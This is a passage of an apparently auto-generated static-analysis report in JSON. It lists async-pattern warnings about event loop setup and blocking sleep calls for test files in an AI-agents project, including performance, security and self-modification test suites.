        "warning": "Async function execute_complex_task may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.444734"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Async function orchestrator may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.444768"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Async function test_1000_concurrent_agents may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.444799"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Async function test_sustained_load_performance may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.444829"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Async function test_memory_scalability may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.444857"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Async function test_response_time_distribution may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.444886"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Async function working_memory may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.444913"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Async function test_10k_token_capacity may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.444942"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Async function test_memory_coherence_under_load may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.444970"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Async function improvement_system may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.445000"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Async function test_15_percent_improvement_target may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.445028"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Async function _measure_system_performance may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.445055"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Async function _apply_improvement_to_agents may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.445081"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Async function test_cpu_utilization_efficiency may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.445109"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Async function test_memory_leak_detection may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.445136"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Async function read_operation may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.445402"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Async function write_operation may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.445428"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Async function search_operation may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.445455"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Async function cpu_monitor may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.445607"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.446438"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.446471"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.447485"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.448603"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.448962"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.449648"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Async function attempt_privilege_escalation may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.455096"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Async function attempt_data_exfiltration may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.455132"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Async function attempt_code_injection may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.455160"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Async function attempt_resource_exhaustion may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.455188"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Async function security_framework may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.455216"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Async function malicious_agent may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.455243"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Async function test_security_framework_initialization may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.455272"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Async function test_malicious_behavior_detection may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.455299"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Async function test_automated_threat_response may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.455327"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Async function test_security_policy_enforcement may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.455355"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Async function test_security_audit_logging may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.455383"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Async function secure_self_modifying_agent may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.455411"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Async function test_code_modification_security may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.455439"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Async function test_sandboxed_code_execution may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.455466"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Async function test_modification_rollback_security may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.455494"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Async function test_modification_approval_workflow may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.455522"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Async function behavioral_monitor may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.455552"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Async function test_normal_behavior_baseline may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.455583"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Async function test_anomaly_detection may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.455621"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Async function test_adaptive_anomaly_detection may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.455650"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Async function threat_detector may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.455678"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Async function test_signature_based_detection may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.455706"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Async function test_behavioral_threat_detection may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.455733"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Async function test_threat_intelligence_integration may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.455761"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Async function emergency_response may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.455789"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Async function test_emergency_detection_and_response may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.455817"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Async function test_graduated_response_escalation may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.455844"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Async function test_recovery_procedures may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.455872"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.457060"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.457103"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.457173"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
        "warning": "Async function execute_benchmark_task may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.466970"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
        "warning": "Async function apply_performance_modification may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.467018"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
        "warning": "Async function self_modifying_agent may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.467058"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
        "warning": "Async function test_code_generation_capabilities may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.467091"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
        "warning": "Async function test_strategy_modification may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.467122"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
        "warning": "Async function test_capability_extension may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.467153"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
        "warning": "Async function test_learning_enhancement may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.467183"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
        "warning": "Async function evolution_system may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.467214"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
        "warning": "Async function evolving_agents may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.467243"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
        "warning": "Async function test_15_percent_improvement_target may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.467274"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
        "warning": "Async function test_evolution_strategy_effectiveness may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.467304"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
        "warning": "Async function test_adaptive_evolution_parameters may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.467333"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
        "warning": "Async function test_multi_objective_optimization may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.467362"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
        "warning": "Async function safe_evolution_system may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.467391"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
        "warning": "Async function test_evolution_stability may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.467420"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
        "warning": "Async function test_rollback_on_performance_degradation may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.467450"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.468686"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.469896"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function test_initial_state may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.476060"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function test_state_transitions_during_processing may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.476091"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function test_think_returns_valid_thought may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.476117"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function test_act_returns_valid_action may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.476141"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function test_observe_updates_metrics may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.476163"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function test_full_processing_pipeline may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.476185"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function test_memory_stores_episodes may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.476209"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function test_memory_recall_similar may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.476230"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function test_memory_pattern_extraction may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.476251"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function test_memory_persistence_with_backend may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.476272"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function test_learning_system_updates may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.476294"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function test_strategy_recommendation may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.476315"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function test_learning_convergence may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.476335"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function test_execute_method_error_handling may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.476357"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function test_tool_execution_error_handling may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.476377"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function test_memory_backend_failure_handling may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.476398"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function test_sub_agent_spawning may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.476421"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function test_agent_collaboration may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.476441"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function test_evolution_trigger may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.476461"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function test_metrics_tracking may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.476481"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function test_tool_selection_for_strategy may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.476503"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function test_async_tool_execution may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.476523"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function test_sync_tool_execution may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.476543"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function test_concurrent_execution_windows may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.476568"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function test_memory_usage_stays_bounded may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.476590"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function test_processing_speed may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.476610"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function async_tool may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.476939"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function execute may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.477068"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function execute may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.477097"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function execute may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.477356"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function execute may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.477415"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function execute may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.477462"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Async function execute may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.477599"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.478676"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Async function test_agent_registration may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.487426"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Async function test_single_agent_delegation may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.487463"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Async function test_multi_agent_delegation may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.487489"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Async function test_no_suitable_agents may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.487515"
      },
      {
        "category": "ASYNC_PATTERN",
